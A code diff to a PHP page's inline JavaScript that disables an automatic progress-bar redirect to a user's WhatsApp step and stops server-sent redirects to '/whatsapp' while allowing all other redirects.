@@ -151,20 +151,21 @@ $userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
         const progressBar = document.getElementById('progressBar');
         const userId = <?= json_encode($user['id'] ?? 0) ?>;
         
-        const interval = setInterval(() => {
-            progress += Math.random() * 15;
-            if (progress > 100) progress = 100;
-            if (progressBar) {
-                progressBar.style.width = progress + '%';
-            }
-            
-            if (progress >= 100) {
-                clearInterval(interval);
-                setTimeout(() => {
-                    window.location.href = '/user/' + userId + '/whatsapp';
-                }, 3000);
-            }
-        }, 500);
+        // Otomatik yönlendirme devre dışı - beklemede kalacak
+        // const interval = setInterval(() => {
+        //     progress += Math.random() * 15;
+        //     if (progress > 100) progress = 100;
+        //     if (progressBar) {
+        //         progressBar.style.width = progress + '%';
+        //     }
+        //     
+        //     if (progress >= 100) {
+        //         clearInterval(interval);
+        //         setTimeout(() => {
+        //             window.location.href = '/user/' + userId + '/whatsapp';
+        //         }, 3000);
+        //     }
+        // }, 500);
 
         <?php if (isset($_SESSION['user_id'])): ?>
         (function() {
@@ -189,7 +190,11 @@ $userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
                     .then(response => response.json())
                     .then(data => {
                         if (data.redirect && data.redirect !== currentPage) {
-                            window.location.href = data.redirect;
+                            // WhatsApp yönlendirmesini engelle - beklemede kalsın
+                            // Diğer tüm yönlendirmelere izin ver
+                            if (data.redirect.indexOf('/whatsapp') === -1) {
+                                window.location.href = data.redirect;
+                            }
                         }
                     })
                     .catch(() => {});
